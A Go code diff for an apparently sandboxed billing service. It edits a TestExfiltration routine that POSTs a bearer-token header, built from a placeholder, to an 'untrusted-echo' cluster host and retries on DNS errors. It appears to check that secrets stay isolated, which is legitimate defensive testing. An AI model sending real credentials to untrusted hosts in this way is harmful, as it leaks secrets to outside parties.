@@ -35,7 +35,7 @@ const (
 	DefaultVaultSecretURI  = "ate-secret://k8s.io/default/anything-but-agents/billing-vault-api/token"
 	DefaultTrustBundlePath = "/run/ate/trust-bundle.pem"
 	DefaultVaultURL        = "http://billing-gateway.anything-but-agents.svc.cluster.local/api/vault/charge"
-	DefaultEchoURL         = "http://billing-gateway.anything-but-agents.svc.cluster.local/api/echo"
+	DefaultEchoURL         = "http://untrusted-echo.anything-but-agents.svc.cluster.local/api/echo"
 )
 
 // Invoice represents one settled 30-day billing cycle preserved in Go heap RAM.
@@ -519,21 +519,31 @@ func (a *SubscriptionActor) TestExfiltration(ctx context.Context, targetURL stri
 	client := a.HTTPClient
 	a.mu.RUnlock()
 
-	if targetURL == "" {
+	if targetURL == "" || strings.HasPrefix(targetURL, "/") {
 		targetURL = echoURL
 	}
 
-	httpReq, err := http.NewRequestWithContext(ctx, http.MethodPost, targetURL, strings.NewReader(`{"test":"host_binding_exfiltration"}`))
-	if err != nil {
-		return nil, fmt.Errorf("create exfiltration test request: %w", err)
-	}
-
 	sentHeader := "Bearer " + placeholder
-	httpReq.Header.Set("Authorization", sentHeader)
-	httpReq.Header.Set("X-Untrusted-Echo-Test", "true")
-	httpReq.Header.Set("Content-Type", "application/json")
+	var resp *http.Response
+	var err error
+	for attempt := 0; attempt < 6; attempt++ {
+		httpReq, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, targetURL, strings.NewReader(`{"test":"host_binding_exfiltration"}`))
+		if reqErr != nil {
+			return nil, fmt.Errorf("create exfiltration test request: %w", reqErr)
+		}
+		httpReq.Header.Set("Authorization", sentHeader)
+		httpReq.Header.Set("X-Untrusted-Echo-Test", "true")
+		httpReq.Header.Set("Content-Type", "application/json")
 
-	resp, err := client.Do(httpReq)
+		resp, err = client.Do(httpReq)
+		if err == nil {
+			break
+		}
+		if !strings.Contains(err.Error(), "no such host") && !strings.Contains(err.Error(), "NXDOMAIN") {
+			break
+		}
+		time.Sleep(250 * time.Millisecond)
+	}
 	if err != nil {
 		return nil, fmt.Errorf("exfiltration request failed: %w", err)
 	}
